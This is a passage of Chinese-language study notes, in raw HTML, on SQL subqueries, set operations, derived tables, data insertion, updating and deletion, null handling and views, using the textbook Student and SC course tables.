alt=\"image-20221202131341962\"></p>\n</li>\n</ul>\n</li>\n<li><p>带有比较运算符的子查询</p>\n<ul>\n<li><p><code>找出每个学生超过他自己选修课程平均成绩的课程号</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> Sno<span class=\"token punctuation\">,</span>Cno <span class=\"token keyword\">FROM</span> SC x <span class=\"token keyword\">WHERE</span> Grade<span class=\"token operator\">>=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token function\">AVG</span><span class=\"token punctuation\">(</span>Grade<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> SC y <span class=\"token keyword\">WHERE</span> y<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>x<span class=\"token punctuation\">.</span>Sno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202133356393.png\" alt=\"image-20221202133356393\"></p>\n</li>\n</ul>\n</li>\n<li><p>带有AND（SOME）或ALL谓词的子查询</p>\n<ul>\n<li><p><code>查询非计算机科学系中比任意一个计算机科学系的学生年龄都小的学生的姓名和年龄</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span>Sage <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">WHERE</span> Sage<span class=\"token operator\">&lt;</span><span class=\"token keyword\">ANY</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> Sage <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">WHERE</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">and</span> Sdept<span class=\"token operator\">&lt;></span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#小于任意一个即可</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202134147599.png\" alt=\"image-20221202134147599\"></p>\n</li>\n<li><p><code>查询非计算机科学系中比任意一个计算机科学系的学生年龄都小的学生的姓名和年龄</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span>Sage <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">WHERE</span> Sage<span class=\"token operator\">&lt;</span><span class=\"token keyword\">ALL</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> Sage <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">WHERE</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">and</span> Sdept<span class=\"token operator\">&lt;></span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#小于所有</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202134555583.png\" alt=\"image-20221202134555583\"></p>\n</li>\n</ul>\n</li>\n<li><p>带有EXISTS谓词的子查询</p>\n<p><font color=red>带有EXISTS谓词的子查询不返回数据只返回逻辑真值与逻辑假值</font></p>\n<ul>\n<li><p><code>选修了一号课程的学生的姓名</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> Sname <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">WHERE</span> <span class=\"token keyword\">EXISTS</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> SC <span class=\"token keyword\">where</span> Cno<span class=\"token operator\">=</span><span class=\"token string\">'1'</span> <span class=\"token operator\">AND</span>\nStudent<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>Sno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202141805285.png\" alt=\"image-20221202141805285\"></p>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"集合查询\"><a href=\"#集合查询\" class=\"headerlink\" title=\"集合查询\"></a>集合查询</h3><p>集合操作的种类：</p>\n<ol>\n<li>并操作 UNION</li>\n<li>交操作 INTERSECT</li>\n<li>差操作 EXCEPT</li>\n</ol>\n<p><font color=red>注：参加集合操作的各查询结果的列数必须相同；对应的数据类型也必须相同</font></p>\n<ol>\n<li><p><code>查询计算机科学系的学生及年龄不大于19岁的学生</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sage<span class=\"token operator\">&lt;=</span><span class=\"token number\">19</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#union 将多个查询结果合并起来，系统自动去掉重复元组</span>\n<span class=\"token comment\">#union all 将多个查询结果合并起来，保留重复元组</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203132840712.png\" alt=\"image-20221203132840712\"></p>\n</li>\n<li><p><code>查询选修了课程1或者选修了课程2的学生</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span>  <span class=\"token keyword\">DISTINCT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">,</span>SC <span class=\"token keyword\">where</span> Student<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>SC<span class=\"token punctuation\">.</span>Sno <span class=\"token operator\">and</span> SC<span class=\"token punctuation\">.</span>Cno<span class=\"token operator\">=</span><span class=\"token string\">'1'</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">select</span>  <span class=\"token keyword\">DISTINCT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">,</span>SC <span class=\"token keyword\">where</span> Student<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>SC<span class=\"token punctuation\">.</span>Sno <span class=\"token operator\">and</span> SC<span class=\"token punctuation\">.</span>Cno<span class=\"token operator\">=</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203133748443.png\" alt=\"image-20221203133748443\"></p>\n</li>\n</ol>\n<h3 id=\"基于派生表的查询\"><a href=\"#基于派生表的查询\" class=\"headerlink\" title=\"基于派生表的查询\"></a>基于派生表的查询</h3><p>子查询不仅可以出现在<code>where子句</code>中，还可以出现在<code>from子句</code>中，这时子查询生成的<code>临时派生表</code>成为主查询对象</p>\n<p><code>查询每个学生超过他自己选修课程平均成绩的课程号</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sno<span class=\"token punctuation\">,</span>Cno <span class=\"token keyword\">from</span> SC<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> Sno<span class=\"token punctuation\">,</span><span class=\"token function\">avg</span><span class=\"token punctuation\">(</span>Grade<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> SC <span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> Sno<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> Avg_sc<span class=\"token punctuation\">(</span>avg_sno<span class=\"token punctuation\">,</span>avg_grade<span class=\"token punctuation\">)</span> <span class=\"token keyword\">WHERE</span> Sno<span class=\"token operator\">=</span>avg_sno <span class=\"token operator\">and</span> Grade<span class=\"token operator\">>=</span>avg_grade<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203142017891.png\" alt=\"image-20221203142017891\"></p>\n<p><code>查询所有选修了1号课程的学生姓名</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> Sname <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> Sno <span class=\"token keyword\">FROM</span> SC <span class=\"token keyword\">WHERE</span> Cno<span class=\"token operator\">=</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span> SC1 <span class=\"token keyword\">WHERE</span> Student<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>SC1<span class=\"token punctuation\">.</span>Sno<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203142502097.png\" alt=\"image-20221203142502097\"></p>\n<h2 id=\"数据更新\"><a href=\"#数据更新\" class=\"headerlink\" title=\"数据更新\"></a>数据更新</h2><h3 id=\"插入数据\"><a href=\"#插入数据\" class=\"headerlink\" title=\"插入数据\"></a>插入数据</h3><ol>\n<li><p>插入一个元组</p>\n<p>语句格式：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token operator\">&lt;</span>表名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>属性列<span class=\"token number\">1</span><span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>属性列<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>常量<span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>常量<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>将一个新学生元组（学号：201215128）；姓名：陈冬；性别：男；所在系：IS；年龄：18岁）插入到Student表中。</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> Student<span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">,</span>Sname<span class=\"token punctuation\">,</span>Ssex<span class=\"token punctuation\">,</span>Sdept<span class=\"token punctuation\">,</span>Sage<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'201215128'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'陈东'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'男'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'IS'</span><span class=\"token punctuation\">,</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203204704729.png\" alt=\"image-20221203204704729\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203204727631.png\" alt=\"image-20221203204727631\"></p>\n<p><code>插入一条选课记录（&#39;201215128&#39;,&#39;1&#39;)</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">into</span> SC<span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">,</span>Cno<span class=\"token punctuation\">,</span>Grade<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span><span class=\"token punctuation\">(</span><span class=\"token string\">'201215128'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token operator\">&lt;</span>表名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>属性列<span class=\"token number\">1</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>属性列<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> 子查询：<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203205007471.png\" alt=\"image-20221203205007471\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203205018798.png\" alt=\"image-20221203205018798\"></p>\n<p><code>对每个系，求学生的平均年龄，并把结果存入数据库中</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">/*先建表*/</span><span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> Dept_age <span class=\"token punctuation\">(</span>Sdept <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>avg_age <span class=\"token keyword\">SMALLINT</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203205512524.png\" alt=\"image-20221203205512524\"></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">into</span> Dept_age<span class=\"token punctuation\">(</span>Sdept<span class=\"token punctuation\">,</span>avg_age<span class=\"token punctuation\">)</span> <span class=\"token keyword\">select</span> Sdept<span class=\"token punctuation\">,</span><span class=\"token function\">AVG</span><span class=\"token punctuation\">(</span>Sage<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> Sdept<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203205748078.png\" alt=\"image-20221203205748078\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203205811314.png\" alt=\"image-20221203205811314\"></p>\n</li>\n</ol>\n<h3 id=\"修改数据\"><a href=\"#修改数据\" class=\"headerlink\" title=\"修改数据\"></a>修改数据</h3><p>基本格式：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">UPDATE</span> <span class=\"token operator\">&lt;</span>表名<span class=\"token operator\">></span> <span class=\"token keyword\">SET</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">>=</span><span class=\"token operator\">&lt;</span>表达式<span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">>=</span><span class=\"token operator\">&lt;</span>表达式<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">WHERE</span><span class=\"token operator\">&lt;</span>条件<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ol>\n<li><p><code>将学生201215121的年龄改为22岁</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">UPDATE</span> Student <span class=\"token keyword\">SET</span> Sage<span class=\"token operator\">=</span><span class=\"token number\">22</span> <span class=\"token keyword\">where</span> Sno<span class=\"token operator\">=</span><span class=\"token string\">'201215121'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203215806818.png\" alt=\"image-20221203215806818\"></p>\n</li>\n<li><p><code>將所有學生年齡增加一歲</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">UPDATE</span> Student <span class=\"token keyword\">SET</span> Sage<span class=\"token operator\">=</span>Sage<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203215914475.png\" alt=\"image-20221203215914475\"></p>\n</li>\n<li><p><code>将计算机系的全体学生的成绩置0</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">UPDATE</span> SC <span class=\"token keyword\">set</span> Grade<span class=\"token operator\">=</span><span class=\"token number\">0</span> <span class=\"token keyword\">WHERE</span> Sno <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> Sno <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">where</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203220428813.png\" alt=\"image-20221203220428813\"></p>\n</li>\n</ol>\n<h3 id=\"删除数据\"><a href=\"#删除数据\" class=\"headerlink\" title=\"删除数据\"></a>删除数据</h3><p>语句格式</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">DELETE</span> <span class=\"token keyword\">FROM</span> <span class=\"token operator\">&lt;</span>表名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">WHERE</span><span class=\"token operator\">&lt;</span>条件<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>删除元组</p>\n<ol>\n<li><p>删除一个元组的值</p>\n<ul>\n<li><p><code>删除学号为201215128的学生记录</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">DELETE</span> <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sno<span class=\"token operator\">=</span><span class=\"token string\">'201215128'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203220934710.png\" alt=\"image-20221203220934710\"></p>\n</li>\n</ul>\n</li>\n<li><p>删除多个元组的值</p>\n<ul>\n<li><p><code>删除所有学生的选课记录</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">DELETE</span> <span class=\"token keyword\">from</span> SC<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203221028823.png\" alt=\"image-20221203221028823\"></p>\n</li>\n</ul>\n</li>\n<li><p>带子查询的删除语句</p>\n<ul>\n<li><p><code>删除计算机科学系所有学生的选课记录</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">DELETE</span> <span class=\"token keyword\">from</span> SC <span class=\"token keyword\">WHERE</span> Sno <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> Sno <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203221226462.png\" alt=\"image-20221203221226462\"></p>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"空值的处理\"><a href=\"#空值的处理\" class=\"headerlink\" title=\"空值的处理\"></a>空值的处理</h3><ol>\n<li><p>空值的产生</p>\n<ul>\n<li><p><code>将Student表中学生号为201215125的学生所属的系改为空值</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">update</span> Student <span class=\"token keyword\">SET</span> Sdept<span class=\"token operator\">=</span><span class=\"token boolean\">NULL</span> <span class=\"token keyword\">where</span> Sno<span class=\"token operator\">=</span><span class=\"token string\">'201215125'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203221622264.png\" alt=\"image-20221203221622264\"></p>\n</li>\n</ul>\n</li>\n<li><p>空值的判断</p>\n<ul>\n<li><p><code>从Student表中找出信息填漏了的学生信息</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span>  Sno <span class=\"token operator\">is</span> <span class=\"token boolean\">NUll</span> <span class=\"token operator\">or</span> Sname <span class=\"token operator\">is</span> <span class=\"token boolean\">null</span> <span class=\"token operator\">or</span> Ssex <span class=\"token operator\">is</span> <span class=\"token boolean\">null</span> <span class=\"token operator\">or</span> Sage <span class=\"token operator\">is</span> <span class=\"token boolean\">null</span> <span class=\"token operator\">or</span> Sdept <span class=\"token operator\">is</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">;</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203222101262.png\" alt=\"image-20221203222101262\"></p>\n</li>\n</ul>\n</li>\n<li><p>空值的约束条件</p>\n<ul>\n<li>定义为not null</li>\n<li>unique</li>\n<li>主码</li>\n</ul>\n</li>\n<li><p>空值的运算</p>\n<ul>\n<li><p><code>找出选修了一号课程不及格的学生以及缺考的学生</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> SC <span class=\"token keyword\">where</span> <span class=\"token punctuation\">(</span>Grade<span class=\"token operator\">&lt;=</span><span class=\"token number\">60</span> <span class=\"token operator\">AND</span> Cno<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span> <span class=\"token punctuation\">(</span>Grade <span class=\"token operator\">is</span> <span class=\"token boolean\">null</span> <span class=\"token operator\">and</span> Cno<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203222726794.png\" alt=\"image-20221203222726794\"></p>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"视图\"><a href=\"#视图\" class=\"headerlink\" title=\"视图\"></a>视图</h2><p>特点：</p>\n<ul>\n<li>虚表，是从一个或者多个基本表或者视图导出的表</li>\n<li>只能存放视图的定义，不存放对应的数据</li>\n<li>基表中的数据发生变化，从视图中查询出来的数据也发生变化</li>\n</ul>\n<h3 id=\"定义视图\"><a href=\"#定义视图\" class=\"headerlink\" title=\"定义视图\"></a>定义视图</h3><p>语句格式：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">VIEW</span> <span class=\"token operator\">&lt;</span>视图名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">AS</span> <span class=\"token operator\">&lt;</span>子查询<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">WITH</span> <span class=\"token keyword\">CHECK</span> <span class=\"token keyword\">OPTION</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\"># [WITH CHECK OPTION]表示对视图进行增删改查操作的时候要保证修改的行满足视图定义中的谓词条件（也就是子查询表达式中的条件）</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>下面三种情况需要指出组成视图的所有列名</p>\n<ul>\n<li>某个目标列不是单纯的属性名，而是聚集函数或者列表达式</li>\n<li>多表连接的时候选出了同名列作为视图的字段</li>\n<li>需要在视图中为某个列启用新的更合适的名字</li>\n</ul>\n<ol>\n<li><p>基于单表</p>\n<ul>\n<li><p><code>创建计算机系学神的视图</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">VIEW</span> CS_Student <span class=\"token keyword\">AS</span> <span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203224115912.png\" alt=\"image-20221203224115912\"></p>\n</li>\n<li><p><code>使得上面的视图在修改时只能加入计算机系的学生</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">VIEW</span> CS_Student <span class=\"token keyword\">AS</span> <span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span> <span class=\"token keyword\">WITH</span> <span class=\"token keyword\">CHECK</span> <span class=\"token keyword\">OPTION</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></li>\n</ul>\n</li>\n<li><p>基于多表</p>\n<ul>\n<li><p><code>建立计算机系选修了一号课程的学生视图</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">VIEW</span> SC_Student1 <span class=\"token keyword\">AS</span> <span class=\"token keyword\">SELECT</span> Student<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">,</span>SC <span class=\"token keyword\">where</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span> <span class=\"token operator\">and</span> Cno<span class=\"token operator\">=</span><span class=\"token string\">'1'</span> <span class=\"token operator\">and</span> Student<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>SC<span class=\"token punctuation\">.</span>Sno<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img 